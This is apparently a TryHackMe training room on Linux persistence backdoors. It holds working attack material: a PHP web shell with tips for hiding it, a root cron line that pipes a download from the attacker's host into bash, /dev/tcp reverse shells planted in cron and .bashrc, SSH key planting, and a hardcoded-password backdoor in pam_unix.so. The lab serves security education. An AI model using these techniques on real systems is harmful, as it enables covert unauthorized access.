{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/92a7eee54c5c4ce8ec4cd7468c2cf028.png', 'title': 'Linux Backdoors', 'description': 'Learn all the different techniques used to backdoor a linux machine!', 'code': 'linuxbackdoors', 'users': 10302, 'tags': ['security', 'linux', 'backdoor'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 665, 'created': '2021-02-05T01:55:43.922Z', 'published': '2021-03-02T19:00:00.222Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://assets.tryhackme.com/img/banners/default_tryhackme.png', 'creator': 'ustoun0', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p>Hey everyone!</p><p>This room is dedicated for learning common Linux backdoors techniques! A backdoor is simply something we can do to ensure our consistent access to the machine.\xa0</p><p>So even if the machine is rebooted, shut down or whatever, we would still be able to have access to it.\xa0</p><p>These aren’t actual vulnerabilities but just ways to maintain your access on a target :)</p><p>To recreate all the backdoor techniques shown in this room, you could simply try them all on your own machine or use the "THM ATTACK BOX" as it\'s </p><p>safer and it doesn\'t matter if you screw anything up.</p><p>Happy Hacking!<br /></p>', 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2021-02-05T12:09:16.063Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'You understand what a backdoor is<br />', 'hint': ''}]}, {'taskTitle': 'SSH Backdoors', 'taskDesc': '<p>The first backdoor we are going to look at is : The SSH Backdoor</p><p>The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory. Usually the user would be root as it’s the user with the highest privileges.\xa0</p><p>So Let’s generate a set of ssh keys with ssh-keygen!</p><p>To do so, simply run the command ssh-keygen as shown below!<br /></p><p><img style="width:695px" src="https://i.imgur.com/JmRkLjw.png" /></p><p>Now that we have 2 keys. 1 private key and 1 public key, we can\xa0<span style="font-size:1rem">now\xa0</span><span style="font-size:1rem">go to /root/.ssh and leave our public key there. Don\'t forget to rename the public key to : authorized_keys</span></p><p>If the directory .ssh is not present, you can always create it using this command : "mkdir .ssh"</p><p>Now that we have left our backdoor, we can simply login as root!</p><p>Before doing so, give the private key the right permissions using : chmod 600 id_rsa.</p><p>This is necessary because if we don\'t do it, ssh will complain about permissions not being secure enough on the key and will most likely , not let us use it.</p><p>After giving the key the right permissions, we can do : "ssh -i id_rsa root@ip" to login into our desired machine!</p><p>One thing to note about this backdoor is:</p><ol><li>\xa0This backdoor isn\'t hidden at all. Anybody with the right permissions would be able to remove our ssh public key or the file authorized_keys entirely.</li></ol><p><br /></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2021-02-05T12:12:31.517Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'In what directory do we place our keys ?', 'hint': ''}, {'questionNo': 2, 'question': '<p>What flag in ssh do we use to show our private key?<br /></p>', 'hint': ''}]}, {'taskTitle': 'PHP Backdoors', 'taskDesc': '<p>Let\'s now get into the second backdoor: PHP Backdoors!</p><p>If you get root access on a Linux host, you will most likely search for creds and or any useful information in the web root.</p><p>The web root is usually located in : /var/www/html</p><p>What you have to know is that, whatever you leave in /var/www/html, will be available for everybody to use in their browser.</p><p>Now that you know that, you can try creating a php file with any name and putting inside this piece of code:</p><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la">&lt;?php<br />    if (isset($_REQUEST[\'cmd\'])) {<br />        echo "&lt;pre&gt;" . shell_exec($_REQUEST[\'cmd\']) . "&lt;/pre&gt;";<br />    }<br />?&gt;</span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la">This code simply takes the parameter "cmd" and will execute anything that is being given to that parameter.</span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la">Notice that we are using : </span><span class="gl kx jd fp kj b di ky kz s la"><span class="gl kx jd fp kj b di ky kz s la">"$_REQUEST[\'cmd\'])", which means that you can pass that parameter either in GET or in POST data.</span></span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la"><span class="gl kx jd fp kj b di ky kz s la">Now that file is saved and ready , we can try to query it.</span></span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la"><span class="gl kx jd fp kj b di ky kz s la">If you left the file in /var/www/html/shell.php | You should be able to access it directly using : http://ip/shell.php</span></span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la"><span class="gl kx jd fp kj b di ky kz s la">If you left the shell somewhere else, look in what directory it is and then try accessing it by doing something like that : http://ip/somedirectory/shell.php<br /></span></span></pre><p>Here are some ways that we could make this backdoor a little more hidden:</p><p>1. Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.</p><p>2. Change the "cmd" parameter to something else... anything actually... just change it to something that isn\'t that common. "Cmd" is really common and is already really well known in the hacking community.<br /></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2021-02-05T13:50:51.102Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'You understand what a PHP Backdoor is<br />', 'hint': ''}]}, {'taskTitle': 'CronJob Backdoors', 'taskDesc': '<p>Let\'s now get into the 3rd backdoor technique!</p><p>This backdoor consists of creating a cronjob!</p><p>If you take a look at your cronjobs file, which is /etc/cronjob, you would see something like this:</p><p><img style="width:749px" src="https://i.imgur.com/ywQIFmb.png" /></p><p>This represents all the tasks that are scheduled to run at some time on your machine.</p><p>Once you got root access on any host, you can add any scheduled task. You could even just configure a task where every minute a reverse shell is sent to you. Which is exactly what we\'re going to do.</p><p>Notice the 2 letters on top of the tasks : "m and h"<br /></p><p>Those are the letters that indicate if the task should run every hour or every minute.</p><p>In the example above, you can see that there is a "*" symbol under the "h". This means that the following task would run every hour. </p><p>Now let\'s get to our backdoor!</p><p>Add this line into our cronjob file :</p><p>* *\xa0\xa0\xa0\xa0 * * *\xa0\xa0 root\xa0\xa0\xa0 curl http://&lt;yourip&gt;:8080/shell | bash<br /></p><p>Notice that we put a "*" star symbol to everything. This means that our task will run every minute, every hour, every day , etc .</p><p>We first use "curl" to download a file , and then we pipe it to "bash"</p><p>The contents of the "shell" file that we are using are simply :</p><p>-------------------------------------------------<br /></p><p>#!/bin/bash</p><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p><p>--------------------------------------------------<br /></p><p>We would have to run an HTTP server serving our shell.</p><p>You can achieve this by running : "python3 -m http.server 8080"<br /></p><p>Once our shell gets downloaded, it will be executed by "bash" and we would get a shell!</p><p>*Don\'t forget to listen on your specified port with "nc -nvlp &lt;port&gt;"*<br /></p><p>Please note that this backdoor isn\'t really hidden because everyone can see it just by looking inside /etc/crontab.<br /></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2021-02-05T14:16:08.487Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What does the letter "m" mean in cronjobs?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What does the letter "h" mean in cronjobs?<br /></p>', 'hint': ''}]}, {'taskTitle': '.bashrc Backdoors', 'taskDesc': '<p><span style="font-family:Ubuntu">Let\'s now get into the: ".bashrc" Backdoor!</span><br /></p><p>If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched.</p><p>So If you know any users that log on to their system quite often, you could simply run this command to include your reverse shell into their ".bashrc".</p><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la"></span><code>echo \'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\' &gt;&gt; ~/.bashrc</code><span class="gl kx jd fp kj b di ky kz s la"></span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la" style="font-family:Ubuntu">One important thing is to always have your nc listener ready as you don\'t know when your user will log on.</span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la" style="font-family:Ubuntu">This attack is very sneaky as nobody really thinks about ever checking their ".bashrc" file.</span></pre><pre class="kp kq kr ks kt ku kv kw"><span class="gl kx jd fp kj b di ky kz s la"><span style="font-family:Ubuntu">On the other hand, you can\'t exactly know if any of the user\'s will actually login to their system, so you might really wait a long period of t</span>ime.<br /></span></pre>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2021-02-05T14:59:05.562Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'You understand what is the ".bashrc" backdoor technique!<br />', 'hint': ''}]}, {'taskTitle': 'pam_unix.so Backdoors', 'taskDesc': '<p>Let\'s now get into the 5th and last backdoor of this room!</p><p>There are many many more backdoors available other than the 5 shown in this room!</p><p>A good resource that I found really helpful when creating this room is: <a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c" target="_blank">link</a></p><p>Okay so, now onto the 5th backdoor.</p><p>The backdoor that we are going to look at is: The pam_unix.so backdoor!</p><p>If you don\'t know what the file "pam_unix.so" is , well , it simply is one of many files in Linux that is responsible for authentication.</p><p>So let\'s actually get into the backdoor!<br /><br /><img style="width:586px" src="https://i.imgur.com/hOuXxXZ.png" /><img style="width:563px" /></p><p>As seen here, the file "pam_unix.so" uses the "unix_verify_password" function to verify to user\'s supplied password.</p><p>Now let\'s look at this screenshot:</p><p><img style="width:626px" src="https://i.imgur.com/jSrHXIs.png" /><img style="width:606px" /><br /></p><p>We can see that we added a new line to our code : "if (strcmp(p, "0xMitsurugi") != 0 )"</p><p>Okay, if this code looks confusing to you at first, don\'t worry!</p><p>We\'ll break it down together!</p><p>So first, we have to know what the function "strcmp" does.</p><p>This function basically compares 2 strings.</p><p>In the screenshot above, we compare the variable "p" and the string "0xMitsurugi".</p><p>The variable "p" stands for the user\'s supplied password. In other words, the password that the user-supplied.</p><p>You can also see "!=0" at the end of the statement. This means "if not successful". So, if the variable "p"(user-supplied password) and the string "0xMitsurugi" are NOT the same... the function "unix_verify_password" will be used.</p><p>But on the other hand, if the variable "p"(user-supplied password) and the string "0xMitsurugi" are the same, the authentication is a success. We mark the success by using "PAM_SUCCESS;"</p><p>So this backdoor essentially consists of adding your own password to "pam_unix.so"</p><p>Since you know the password that you added into the file, you will always be able to authenticate with that password until it\'s removed from "pam_unix.so"</p><p>So let\'s do a little recap:</p><p>Say a user types the password "password123" and tries to authenticate. We will compare his password(password123) to the string "0xMitsurugi".</p><p>If those two strings match, the authentication is successful. But those 2 strings do not match, so the authentication will not be </p><p>successful and will rely on the "unix_verify_password" function. When using the "unix_verify_password" function to authenticate, the function takes </p><p>the user\'s password from "/etc/shadow" and compares it to the user\'s supplied password. This is how the intended authentication system should work. </p><p>However, this technique is called a backdoor as you add your own password that you can always use as long as nobody takes it out of "pam_unix.so".</p><p>This backdoor is really hard to spot, as once again, nobody really thinks about looking into such files. </p><p>Since this method is slowly becoming more and more popular, you probably won\'t be able to do it every time, as everybody would slowly but surely, understand how to protect themselves.</p><p>Resource used : <a href="http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html" target="_blank">http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html</a></p><p>Here is a GitHub repository containing a script automating this process of creating a backdoor: <a href="https://github.com/zephrax/linux-pam-backdoor" target="_blank">https://github.com/zephrax/linux-pam-backdoor</a><br /><br /></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2021-02-05T15:10:26.241Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'I understand the art of linux backdoors!<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>Finish The Room!<br /></p>', 'hint': ''}]}]}